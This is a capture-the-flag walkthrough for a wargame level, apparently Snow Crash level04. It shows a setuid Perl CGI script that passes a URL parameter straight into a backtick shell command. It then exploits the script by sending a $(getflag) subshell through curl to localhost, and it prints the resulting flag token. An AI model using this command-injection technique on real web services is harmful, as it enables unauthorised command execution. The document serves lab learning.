What do we have?

	$ ll
	total 16
	dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 ./
	d--x--x--x  1 root    users    340 Aug 30  2015 ../
	-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout*
	-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc*
	-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
	-r-x------  1 level04 level04  675 Apr  3  2012 .profile*

A `.pl` file, with `-rws` in right! After searching, a `.pl` file is a Perl script. Let's `cat` it:

	$ cat level04.pl 
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
		$y = $_[0];
		print `echo $y 2>&1`;
	}
	x(param("x"));

It's a CGI call for a server on `localhost:4747`, to execute `x`. We need to give it `getflag` for sure, and we remembered seeing a `level04` folder in `/var/www/` while searching in the VM for the first level. Webserv's skills come handy there. We'll `curl` the server, calling the CGI, and giving it a subshell call to `getflag` as a parameter.

	$ curl http://localhost:4747/level04.pl?x=$(getflag)
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
	$y = $_[0];
	print `echo $y 2>&1`;
	}
	x(param("x"));
	curl: (6) Couldn't resolve host 'flag.Here'
	curl: (6) Couldn't resolve host 'is'
	curl: (6) Couldn't resolve host 'your'
	curl: (6) Couldn't resolve host 'token'
	curl: (6) Couldn't resolve host ''
	curl: (6) Couldn't resolve host 'Nope'
	curl: (6) Couldn't resolve host 'there'
	curl: (6) Couldn't resolve host 'is'
	curl: (6) Couldn't resolve host 'no'
	curl: (6) Couldn't resolve host 'token'
	curl: (6) Couldn't resolve host 'here'
	curl: (6) Couldn't resolve host 'for'
	curl: (6) Couldn't resolve host 'you'
	curl: (6) Couldn't resolve host 'sorry.'
	curl: (6) Couldn't resolve host 'Try'
	curl: (6) Couldn't resolve host 'again'
	curl: (6) Couldn't resolve host ''

After hours of doubts and exploration of new techniques, we released we simply forgot the single quotes on our first attempt, triggering the subshell directly in our own shell, and not in the call to curl. T_T

	$ curl 'http://localhost:4747/level04.pl?x=$(getflag)'
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
